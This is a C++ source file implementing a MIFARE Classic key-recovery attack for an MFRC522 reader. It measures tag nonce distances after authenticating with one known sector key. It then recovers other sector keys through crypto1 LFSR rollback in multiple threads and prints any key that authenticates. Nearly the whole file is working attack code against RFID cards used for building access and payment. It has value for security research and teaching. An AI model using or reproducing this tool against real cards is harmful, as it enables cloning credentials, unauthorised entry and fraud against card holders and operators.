/*30-03-17*****************************************************************************************************
***************************************************************************************************************
**                                                                                                           **
**                                                 MFrec.cpp                                                 **
**                                                                                                           **
***************************************************************************************************************
**************************************************************************************************************/

#include "MFrec.h"


/*=============================================================================================================

NAME:                                             ~MFrec(constructor)
ARGUMENT(S):
DESCRIPTION: initializes
RETURN:

==============================================================================================================*/

MFrec::MFrec()
    : m_auth( new Authentication ),
      m_authInfo( new AuthInfo ),
      RC522(),
      possibleKeys(SETS_NR)
{
    // empty
}

/*=============================================================================================================

NAME:                                             ~MFrec(destructor)
ARGUMENT(S):
DESCRIPTION: clean up dynamic variables
RETURN:

==============================================================================================================*/

MFrec::~MFrec()
{
    delete m_auth;
    delete m_authInfo;
}

/*#############################################################################################################

Section:                                          ~key recovery

#############################################################################################################*/


/*=============================================================================================================

NAME:                                             ~crackKey
ARGUMENT(S): auth cmd, exploit addr (block with known key), attack addr (key to recover), opt key for exploit bloc 
DESCRIPTION: cracks a sector key
RETURN:

==============================================================================================================*/


void MFrec::crackKey( byte command, byte blockAddr_e, byte blockAddr_a, byte *key /*= nullptr*/ )
{
#if RC522_DBG
    std::cout << "crackKey\n";
#endif

    std::cout << "Recovering keys.. this may take some time\n";

    struct timespec start, finish;
    double totalElapsed = 0;
    double elapsed = 0;

    uint32_t n_T;

    uint64_t duplicateKeys[10]={0};
    std::vector<uint64_t>allKeys;
    allKeys.reserve(2e6);

    byte plausibleKey[6];
;

    if( ( pthread_mutex_init( &m_lock, NULL ) ) != 0 )
    {
	std::cerr << "Error initializing mutex\n";
	return;
    }


    const int delayTime = 10;

    
    /*-------------------------------------- RECOVERY LOOP  ---------------------------------------*/
    for( int probe = 0; probe < PROBE_NR; probe++ )
    {
	clock_gettime( CLOCK_MONOTONIC, &start );
    
	/*-------------------------------------- get nonce distance  ---------------------------------------*/
	if( !authenticateManually( command, blockAddr_e, &n_T, key ) )
	{
	    std::cerr << "Not the right key? Could not authenticate\n";
	    break;
	}

	if( nonceDistance( &n_T ) == 0 )
	{
	    std::cerr << "Error: could not find nonce distance\n";
	    break;
	}

	resetPICC( delayTime );

    
	/*-------------------------------------- find possible keys  ---------------------------------------*/

	t_cmd = command;// stupid way to pass arguments to threads
	t_blockAddr = blockAddr_a;
	id_index = 0;// reset thread counter
	
	for( int sets = 0; sets<SETS_NR; sets++ )
	{
	    pthread_create( &t_id[sets], NULL, t_recoverKey_wrapper, this );
	    #if RC522_DBG
	    std::cout << "Made thread " << sets << std::endl;
	    #endif
	}

	for( int sets = 0; sets<SETS_NR; sets++ ) pthread_join( t_id[sets], NULL );

       

	/*
	 * we should now have found a good amount of possible keys having 32 bits correct, now we sort
	 * them and find a good cluster of equal keys
	 */

	for( int sets = 0; sets<SETS_NR; sets++ )// put the possible keys in a joint vector
	{
	    allKeys.insert( allKeys.end(), possibleKeys[sets].begin(), possibleKeys[sets].end() );
	}
	
	std::sort( allKeys.begin(), allKeys.end() );

	int size = allKeys.size()-1;
	int maxCount = 0;// start with 1 or more repeated keys
	int index = 0;
	int counter = 0;

	for( int i = 0; i<size; i++ )
	{
	    while( i<size && allKeys[i] == allKeys[i+1] )// identical neighbors
	    {
		i++;
		counter++;
	    }

	    if( counter > maxCount )
	    {
		maxCount = counter;

		if( index >9 ) index = 0;// rolling buffer
		duplicateKeys[index++] = allKeys[i-1];// store the 10 most frequent keys, most frequent last
	    }
	    counter = 0;
	}
	


	// time the recovery process
	clock_gettime( CLOCK_MONOTONIC, &finish );
	elapsed = (finish.tv_sec - start.tv_sec);
	elapsed += (finish.tv_nsec - start.tv_nsec) / 1000000000.0;
	totalElapsed += elapsed;


        
	std::cout << "<" << elapsed << ">" << "Round " << probe+1 << ": Found " << allKeys.size()
		  << " possible keys, with most repeated key: " << maxCount << std::endl;

	   
	for( int d = 9; d>=0; d-- )
	{
	    uint64_t pk = duplicateKeys[d];
	    uint64_t pkStore = pk;
	    duplicateKeys[d] = 0;

	    if( pk==0 ) continue;
	
	    for( int i = 0; i<6; i++ )
	    {
		plausibleKey[i] = (byte)pk;
		pk >>= 8;
	    }

	    #if RC522_DBG
	    std::cout << "Trying: " << std::hex << pkStore << std::dec << std::endl;
	    #endif

	    parityOn();
	    initCom();
	
	
	    if( authenticateManually( command, blockAddr_a, &n_T, plausibleKey ) )
	    {
		std::cout << "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n"
			  << "KEY FOUND TO BE:\t\t" << std::hex << pkStore << std::dec << std::endl
			  << "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n"
			  << "Time to crack: " << totalElapsed << std::endl;

		// clean up
		pthread_mutex_destroy(&m_lock);
		for( int sets = 0; sets>SETS_NR; sets++ )
		{
		    possibleKeys[sets].clear();
		}
		return;
	    }
	    
	    #if RC522_WIRE
	    delay(delayTime);
	    #endif
	}// for d

	/*-------------------------------------- clean up  ---------------------------------------*/
	for( int sets = 0; sets<SETS_NR; sets++ )
	{
	    possibleKeys[sets].clear();
	}
	allKeys.clear();

	resetPICC( delayTime );
	parityOn();
	initCom();

    }// keep trying

    pthread_mutex_destroy(&m_lock);
    std::cout << "Could not find key, time elapsed: " << totalElapsed << std::endl;

}// crackKey

/*#############################################################################################################

Section:                                          ~PICC IO

#############################################################################################################*/


/*=============================================================================================================

NAME:                                             ~authenticateManually
ARGUMENT(S):
DESCRIPTION: handles parity and encryption
RETURN:

==============================================================================================================*/


bool MFrec::authenticateManually( byte command, byte blockAddr, uint32_t *n_T, byte *key /*=nullptr*/ )
{
#if RC522_DBG
    std::cout << "authenticateManually\n";
#endif

    byte packet[9];
    byte parityBits[8];
    byte data[8];

    parityOff();

    // authCommand will be used by several functions
    // plaintext authentication command => request n_T
    m_auth->authCommand[0] = command;// auth A or B
    m_auth->authCommand[1] = blockAddr;
    calcCRC( m_auth->authCommand, 2, &m_auth->authCommand[2] );

    for( int i = 0; i<4; i++ )
    {
	m_auth->authParityBits[i] = oddparity( m_auth->authCommand[i] );
    }
    
    byte validBits = makeRawFrame( m_auth->authCommand, 4, m_auth->authParityBits, packet );
    
#if RC522_DBG
    std::cout << "Requesting n_T\n";
#endif

    if( !piccIO( TRANSCEIVE, 5, packet, 9, validBits) )
    {
	parityOn();
	return false;
    }

    extractData( packet, 5, parityBits, data ); 
    
    // get back 32 bit TAG nonce
    *n_T = bytesToInt( data, 4 );

#if DBG
    std::cout << std::hex << "Got: " << *n_T << std::dec << std::endl;
#endif


    // load keystream with key (48 bits)

    if( key == nullptr )// use previosly stored key (or default)
    {
	key = &p_keys[ blockAddr/4 ][0];
    }

    uint64_t sectorKey = bytesToInt( key, 6);
    m_authInfo->key = sectorKey;
    
#if RC522_DBG
    std::cout << "Using key: "<< std::hex << sectorKey << std::dec << std::endl;
#endif
	
    keystream = crypto1_create( sectorKey );

    // append uid ^n_T (32 bits) to keystream
    crypto1_word( keystream, *n_T ^ UID, 0/*not encrypted*/);

#if RC522_DBG
    std::cout << "And UID: " << std::hex << UID << std::dec << std::endl;
#endif


    // we dont bother with a random reader nonce, it is initialized to 0 0 0 0
    byte n_R[4] = {0};
    // encrypt reader nonce with keystream1
    for( int i = 0; i<4; i++ )
    {
	data[i] = crypto1_byte( keystream, n_R[i], 0/*not encrypted*/ ) ^ n_R[i];// encrypt and add to keystream
	parityBits[i] = filter( keystream->odd ) ^ oddparity( n_R[i] );// encrypt the parity bit
    }

    // simulate 32 shifts of the RNG making n_R
    *n_T = prng_successor( *n_T, 32 );

    // find the reader answer a_R to n_T
    for( int i = 4; i<8; i++ )
    {
	*n_T = prng_successor( *n_T, 8 );// simulate 8 bit shifts for making ans byte
	data[i] = crypto1_byte( keystream, 0x00, 0 ) ^ ( *n_T & 0xFF );// encrypt a_R with keystream2 (succ2)
	parityBits[i] = filter( keystream->odd ) ^ oddparity( *n_T );// encrypt parity bit
    }

#if RC522_DBG
    std::cout << "(encrypted) Parity bits: ";
    for( int i = 0; i<8; i++ )
    {
	std::cout << (int) parityBits[i] << " ";
    }
    std::cout << std::endl;
#endif

    // make packet

    validBits = makeRawFrame( data, 8, parityBits, packet );
    

    if( !piccIO( TRANSCEIVE, 9, packet, 9, validBits ) )
    {
	parityOn();
	return false;// send encrypted n_R and a_R
    }

    extractData( packet, 5, parityBits, data );
    
    // should have received a_T (4 bytes)
    uint32_t a_T = bytesToInt( data, 4 );// encrypted

    *n_T = prng_successor( *n_T, 32 );// keep up with shifting

    // decrypt a_T
    a_T = crypto1_word( keystream, 0x00, 0 ) ^ a_T;

    if( !( a_T == *n_T & 0xFFFF ) )
    {
	std::cerr << "Incorrect TAG answer\n";
	parityOn();
	return false;
    }

#if RC522_DBG
    std::cout << "Authentication complete\n";
#endif

    currentlyAuthenticated = blockAddr/4;
    knownBlock = blockAddr;

    return true;
       
}// authentiateManually



/*=============================================================================================================

NAME:                                             ~parityOff
ARGUMENT(S):
DESCRIPTION: turns the parity handeling of MFRC522 off, now raw frames can be sent (excluding start and stop bit)
RETURN:

==============================================================================================================*/

void MFrec::parityOff()
{
    m_val = 0x10;
    writeRegister( MF_RX_REG, &m_val );
}

/*=============================================================================================================

NAME:                                             ~parityOn
ARGUMENT(S):
DESCRIPTION: turns the parity handeling of MFRC522 on
RETURN:

==============================================================================================================*/

void MFrec::parityOn()
{
    m_val = 0x00;
    writeRegister( MF_RX_REG, &m_val );
}


/*=============================================================================================================

NAME:                                             ~resetPICC
ARGUMENT(S): waitTime is given so it can be tuned to be as little as possible
DESCRIPTION: turns the antenna on and off so card is reset and we can authenticate again
RETURN:

==============================================================================================================*/

void MFrec::resetPICC( int waitTime )
{
    	antennaOff();// reset communication for new authentications
	#if RC522_WIRE
	delay(waitTime);
	#endif
	antennaOn();
}

/*#############################################################################################################

Section:                                          ~Frame manipulators

#############################################################################################################*/


/*=============================================================================================================

NAME:                                             ~makeRawFrame
ARGUMENT(S): data bytes, nr of data bytes, paritybits for each byte, buffer to store packet (min dataLen+dataLen+1)
DESCRIPTION: makes a packet including paritybits after each data byte, max dataLen = 8
RETURN: nr of valid bits in the last byte

==============================================================================================================*/

byte MFrec::makeRawFrame( byte *data, byte dataLen, byte *parityBits, byte *packet )
{

    // data sent to FIFO LSB first
    packet[0] = data[0];
    packet[1] = ( parityBits[0] | (data[1]<<1) );
    int i;
    for( i = 2; i< dataLen; i++ )
    {
	packet[i] = ( (parityBits[i-1]<<(i-1) ) | (data[i-1]>>(9-i) ) );// add the remaining prev byte and parity
	packet[i] |= (data[i]<<i);// add next byte and push i bits
    }
    packet[dataLen] = ( (parityBits[dataLen-1]<<(i-1)) | (data[dataLen-1]>>(9-i) ) );// add remainder of last byte + end parity

    #if RC522_DBG
    std::cout << "Packing: ";
    for(int i=0; i<dataLen; i++ )
    {
	for(int j=7; j>=0; j-- )
	{
	    std::cout << (int)( data[i]>>j & 1 );
	}
	std::cout << " ";
    }
    std::cout << "\nSending: ";
    for(int i = 0; i<dataLen+1; i++ )
    {
	for(int j=7; j>=0; j-- )
	{
	    std::cout << (int)( packet[i]>>j & 1 );
	}
	std::cout << " ";
    }
    std::cout << std::dec << std::endl;
    
    #endif


    return dataLen%8;
    
}// makeRawFrame

/*=============================================================================================================

NAME:                                             ~extractData
ARGUMENT(S): packet to extract from, length of packet, buffer to hold parity, buffer to hold data
DESCRIPTION: takes a raw frame and separates parity and data max len = 8
RETURN:

==============================================================================================================*/

void MFrec::extractData( byte *packet, byte len, byte *parityBits, byte *data )
{
    data[0] = packet[0];
    
    int i;
    for( i = 1; i<len-1; i++)
    {
	parityBits[i-1] = ( packet[i] & (1<<(i-1)) )>>(i-1);
	data[i] = (packet[i]>>i) | (packet[i+1]<<(8-i));
    }
    parityBits[i-1] = (packet[i] & (1<<(i-1)) )>>(i-1);

#if RC522_DBG
    std::cout << "Packet: ";
    for( int i = 0; i<len; i++ )
    {	
	for(int j=7; j>=0; j-- )
	{
	    std::cout << (int)( packet[i]>>j & 1 );
	}
	std::cout << " ";
    }
    std::cout << "\nExtracted data: ";
    for( int i = 0; i<len-1; i++ )
    {	
	for(int j=7; j>=0; j-- )
	{
	    std::cout << (int)( data[i]>>j & 1 );
	}
	std::cout << " ";
    }
    std::cout << "\nExtracted parity: ";
    for( int i = 0; i<len-1; i++ )
    {
	std::cout << (int)parityBits[i];
    }
    std::cout << std::endl;
#endif

}// extractData

/*#############################################################################################################

Section:                                          ~crypto

#############################################################################################################*/


/*=============================================================================================================

NAME:                                             ~nonceDistance
ARGUMENT(S):
DESCRIPTION: does a nr of encrypted authentications to find the median nonce distance (shifts) of the lfsr
RETURN: median nonce distance if success, 0 if not

==============================================================================================================*/

uint32_t MFrec::nonceDistance( uint32_t *n_T )
{
#if RC522_DBG
    std::cout << "nonceDistance\n";
#endif
    
    byte packet[9];
    byte data[8];
    byte parityBits[8];
    byte validBits;
    // we take the median distance of several authentications for accuracy

    uint32_t newNonce;
    uint32_t encNonce;
    uint32_t a_T;

    for( int i = 0; i<DIST_NR; i++ )
    {
	for(int j = 0; j<4; j++ )
	{
	    m_auth->encAuthCommand[j] = crypto1_byte( keystream, 0x00, 0 ) ^ m_auth->authCommand[j];// encrypt authentication command with keystream
	    m_auth->authParityBits[j] = filter(keystream->odd) ^ oddparity( m_auth->authCommand[j] );
	}

	validBits = makeRawFrame( m_auth->encAuthCommand, 4, m_auth->authParityBits, packet );

#if RC522_DBG
	std::cout << "Requesting (encrypted) TAG nonce\n";
#endif
	if( !piccIO( TRANSCEIVE, 5, packet, 9, validBits ) )
	{
	    std::cerr << "Error: encrypted authentication command\n";
	    parityOff();
	    return 0;
	}

	// extract the encrypted nonce
	extractData( packet, 5, parityBits, data );
	encNonce = bytesToInt( data, 4 );
    
	// reset keystream
	keystream = crypto1_create( m_authInfo->key );

	newNonce = encNonce ^ crypto1_word( keystream, encNonce ^ UID, 1 );// decrypt nonce

	m_authInfo->distances[i] = nonce_distance( *n_T, newNonce );// save the distance


	byte n_R[4] =  {0};
	// make encrypted n_R
	for( int j = 0; j<4; j++ )
	{
	    data[j] = crypto1_byte( keystream, n_R[j], 0 ) ^ n_R[j];
	    parityBits[j] = filter(keystream->odd) ^ oddparity( n_R[j] );
	}
	*n_T = prng_successor( newNonce, 32 );// update current nonce

	// make encrypted a_R
	for( int j = 4; j<8; j++ )
	{
	    *n_T = prng_successor( *n_T, 8 );
	    data[j] = crypto1_byte( keystream, 0x00, 0 ) ^ ( *n_T & 0xFF );
	    parityBits[j] = filter( keystream ->odd ) ^ oddparity( *n_T );
	}

	validBits = makeRawFrame( data, 8, parityBits, packet ); 

#if RC522_DBG
	std::cout << "Sending READER nonce and reader answer\n";
#endif
	// send
	if( !piccIO( TRANSCEIVE, 9, packet, 9, validBits ) )
	{
	    std::cout << "Error: encrypted n_R, a_R\n";
	    parityOff();
	    return 0;
	}

	*n_T = prng_successor( *n_T, 32 );

	// check TAG answer
	extractData( packet, 5, parityBits, data ); 
	a_T = bytesToInt( data, 4 );
	if( (crypto1_word( keystream, 0x00, 0 ) ^ a_T ) != (*n_T & 0xFFFFFFFF) )
	{
	    std::cerr << "Error: TAG answer\n";
	    parityOff();
	    return 0;
	}
#if RC522_DBG
	std::cout << "Distance round " << i << " successful\n";
#endif



    }// distance loop

    medianNonceDist = median( m_authInfo->distances, DIST_NR );

#if RC522_DBG
    std::cout << "Found median distance: " << medianNonceDist << std::endl;
#endif
    
    return medianNonceDist;
    
}// nonceDistance


/*=============================================================================================================

NAME:                                             ~oddparity
ARGUMENT(S):
DESCRIPTION: checks a byte for odd parity
RETURN: true if odd parity bit should be set (even nr of set bits in byte)

==============================================================================================================*/

byte MFrec::oddparity(const byte bt)
{
  // cf http://graphics.stanford.edu/~seander/bithacks.html#ParityParallel
  return (0x9669 >> ((bt ^(bt >> 4)) & 0xF)) & 1;
}


/*=============================================================================================================

NAME:                                             ~median
ARGUMENT(S):
DESCRIPTION: sorts an array and
RETURN: the median

==============================================================================================================*/

uint32_t MFrec::median( uint32_t *a, const int len )
{
    std::sort( a, a+len );

    int median = len/2;
    if( len%2 )//odd
    {
	return a[median];
    }

    return a[median -1 ];
}

/*=============================================================================================================

NAME:                                             ~isNonce
ARGUMENT(S):
DESCRIPTION: checks if the given none nt is valid with respect to the parities
RETURN: 1 if valid, 0 if not

==============================================================================================================*/

byte MFrec::isNonce( uint32_t Nt, uint32_t NtEnc, uint32_t Ks1 , byte *parity)
{
    /*
     * the parities of the first 3 nonce bytes are encrypted with ks1' bit 8, 16, 24, these must be equal 
     * to the ones we extracted from the encrypted session. 
     */
   
    return ((oddparity((Nt >> 24) & 0xFF) == ((parity[0]) ^ oddparity((NtEnc >> 24) & 0xFF) ^ BIT(Ks1, 16))) & \
          (oddparity((Nt >> 16) & 0xFF) == ((parity[1]) ^ oddparity((NtEnc >> 16) & 0xFF) ^ BIT(Ks1, 8))) & \
	    (oddparity((Nt >> 8) & 0xFF) == ((parity[2]) ^ oddparity((NtEnc >> 8) & 0xFF) ^ BIT(Ks1, 0)))) ? 1 : 0;
}// isNonce

/*#############################################################################################################

  Section:                                          ~threading

#############################################################################################################*/


/*=============================================================================================================

NAME:                                             ~t_recoverKey
ARGUMENT(S):
DESCRIPTION: threaded version to speed things up
RETURN:

==============================================================================================================*/

void MFrec::t_recoverKey( )
{

    uint64_t tmpPossibleKey;

    byte packet[9];
    byte unencData[8];
    byte data[8];
    byte parityBits[8];
    byte validBits;
    byte nonceParity[3];
    uint32_t n_T;
    int index = 0;

    if( pthread_mutex_lock(&m_lock) != 0 )// only accessible for 1 thread at a time
    {
	std::cout << "Could not lock mutex\n";
	return;
    }

    // make variables local to thread
    uint32_t medianDist = medianNonceDist;
    uint64_t uid = UID;

    parityOn();
    initCom();
    
    if( !authenticateManually( t_cmd, knownBlock, &n_T ) )// initial authentication
    {
	pthread_mutex_unlock(&m_lock);
	return;
    }
    
    // make encrypted nonce request after authentication
    unencData[0] = t_cmd;
    unencData[1] = t_blockAddr;
    calcCRC( unencData, 2, &unencData[2] );

    for( int i = 0; i<4; i++ )
    {
	data[i] = crypto1_byte( keystream, 0x00, 0 ) ^ unencData[i];
	parityBits[i] = filter( keystream->odd ) ^ oddparity( unencData[i] );
    }

    validBits = makeRawFrame( data, 4, parityBits, packet );


    index = id_index++;// keep track of which thread this is
    #if RC522_DBG
    std::cout << "Key recovery, thread " << index+1 << std::endl;
    #endif
    possibleKeys[index].reserve(300000);// make space for keys


    #if RC522_DBG
    std::cout << "Requesting enc nonce, for recovery\n";
    #endif


    if( !piccIO( TRANSCEIVE, 5, packet, 9, validBits ) )
    {
	std::cerr << "Encrypted nonce req failed\n";
	pthread_mutex_unlock(&m_lock);
	return;
    }

    resetPICC(10);

    pthread_mutex_unlock(&m_lock);// done with shared stuff


    extractData( packet, 5, parityBits, data );

    // get encrypted nonce
    uint32_t encN_T = bytesToInt( data, 4 );

    // keep the returned parity
    for( int i = 0; i<3; i++ )
    {
	nonceParity[i] = ( oddparity(data[i]) != parityBits[i] );
	// little check: the data and parity is enc with the same bits of keystream
    }


    // recovery time!
    struct Crypto1State *revstate;
    struct Crypto1State *revstateStart;
    uint32_t ks1;// keystream 1

    uint32_t guessN_T = prng_successor( n_T, medianDist-TOLERANCE );

    // use the area around the found distance to find possible keys
    for( int j = ( medianDist - TOLERANCE ); j<=( medianDist + TOLERANCE ); j+=2 )
    {
	ks1 = encN_T ^ guessN_T;// try to recover keystream 1

	revstateStart = nullptr;

	if( isNonce( guessN_T, encN_T, ks1, nonceParity ) )
	{
	    // recover first 32 bits of key
	    revstate = lfsr_recovery32( ks1, guessN_T ^ uid );
	    
	    if( revstateStart == nullptr ) revstateStart = revstate;

	    while( (revstate->odd != 0x0) || (revstate->even != 0x0) )// 6 bytes
	    {
		lfsr_rollback_word( revstate, guessN_T ^ uid, 0 );
		crypto1_get_lfsr( revstate, &tmpPossibleKey );

		possibleKeys[index].push_back( tmpPossibleKey );
		revstate++;
	    }
	    free( revstateStart );
	}// isNonce
	
	guessN_T = prng_successor( guessN_T, 2 );// new guess
		    
    }// recovery area loop


}// t_recoverKey
